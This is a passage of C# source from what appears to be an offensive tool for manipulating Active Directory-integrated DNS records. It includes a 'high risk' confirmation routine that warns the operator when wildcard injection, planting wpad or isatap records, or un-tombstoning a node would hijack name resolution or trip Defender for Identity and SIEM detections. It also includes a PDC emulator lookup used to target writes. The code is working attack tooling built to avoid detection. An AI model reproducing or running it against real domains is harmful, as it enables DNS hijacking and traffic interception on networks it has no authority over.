                Logger.Err("Reason: {0}", reason);
                return false;
            }

            Console.Error.WriteLine("[!] HIGH RISK: {0}", reason);
            Console.Error.Write("[?] Proceed? [y/N]: ");
            string line = Console.In.ReadLine();
            bool ok = line != null &&
                      (line.Trim().Equals("y",   StringComparison.OrdinalIgnoreCase) ||
                       line.Trim().Equals("yes", StringComparison.OrdinalIgnoreCase));
            if (!ok) Logger.Info(opt, "Declined by user.");
            return ok;
        }

        private static string DetectReason(Options opt, DirectoryEntry existingNode)
        {
            if (opt.Action == "remove")
                return "remove is a hard-delete of the dnsNode object (visible as an " +
                       "objectClass=dnsNode delete event in DS-Access auditing).";

            if (opt.Action == "add")
            {
                if (opt.Name == "*")
                    return "wildcard injection hijacks every unresolved name in the zone.";

                if (opt.Name != null &&
                    (opt.Name.Equals("wpad",   StringComparison.OrdinalIgnoreCase) ||
                     opt.Name.Equals("isatap", StringComparison.OrdinalIgnoreCase)))
                    return "'" + opt.Name + "' is on the DNS server's Global Query Block " +
                           "List and is heavily monitored by Microsoft Defender for Identity " +
                           "and most SIEM rule packs.";

                if (existingNode != null && Actions.IsTombstoned(existingNode))
                    return "node is currently TOMBSTONED; --force would un-tombstone it " +
                           "(dNSTombstoned: TRUE -> FALSE is a known IOC for ADIDNS abuse).";
            }

            return null;
        }
    }

    // -----------------------------------------------------------------------
    // Replication awareness (PDC emulator detection)
    // -----------------------------------------------------------------------
    internal static class Replication
    {
        public static int CheckBeforeAction(Options opt)
        {
            if (!opt.RequirePdc && !opt.ShowPdc) return ExitCodes.Success;

            string pdc = GetPdcHostname(opt);
            if (pdc == null)
            {
                if (opt.RequirePdc)
                {
                    Logger.Err("--require-pdc: could not determine the PDC emulator");
                    return ExitCodes.LdapError;
                }
                Logger.Warn("--show-pdc: could not determine the PDC emulator");
                return ExitCodes.Success;
            }

            Logger.Info(opt, "PDC emulator: {0}", pdc);

            if (!opt.RequirePdc) return ExitCodes.Success;

            if (string.IsNullOrEmpty(opt.Server))
            {
                Logger.Err("--require-pdc: no --server given; cannot verify the target is the PDC");
                return ExitCodes.UsageError;
            }

            if (!opt.Server.Equals(pdc, StringComparison.OrdinalIgnoreCase) &&
                !FirstLabelMatches(opt.Server, pdc))
            {
                Logger.Err("--require-pdc: --server '{0}' does not match PDC emulator '{1}'", opt.Server, pdc);
                return ExitCodes.UsageError;
            }

            Logger.Ok("--require-pdc: --server is the PDC emulator");
            return ExitCodes.Success;
        }

        private static bool FirstLabelMatches(string a, string b)
        {
            if (a == null || b == null) return false;
            string la = a.Split('.')[0];
            string lb = b.Split('.')[0];
            return la.Equals(lb, StringComparison.OrdinalIgnoreCase);
        }

        public static string GetPdcHostname(Options opt)
        {
            try
            {
                string defaultNc;
                using (DirectoryEntry rootDse = LdapOps.Open(opt, "rootDSE"))
                {
                    if (!rootDse.Properties.Contains("defaultNamingContext")) return null;
                    defaultNc = rootDse.Properties["defaultNamingContext"].Value as string;
                    if (string.IsNullOrEmpty(defaultNc)) return null;
                }

                string fsmoOwner;
                using (DirectoryEntry domain = LdapOps.Open(opt, defaultNc))
                {
                    if (!domain.Properties.Contains("fSMORoleOwner")) return null;
                    fsmoOwner = domain.Properties["fSMORoleOwner"].Value as string;
                    if (string.IsNullOrEmpty(fsmoOwner)) return null;
                }

                // fSMORoleOwner = "CN=NTDS Settings,CN=<dc>,CN=Servers,..."
                int comma = fsmoOwner.IndexOf(',');
                if (comma < 0) return null;
                string serverDn = fsmoOwner.Substring(comma + 1);

                using (DirectoryEntry server = LdapOps.Open(opt, serverDn))
                {
                    if (!server.Properties.Contains("dNSHostName")) return null;
                    return server.Properties["dNSHostName"].Value as string;
                }
            }
            catch (Exception ex)
            {
                Logger.Verbose(opt, "PDC lookup failed: {0}", ex.Message);
                return null;
            }
        }
    }
}
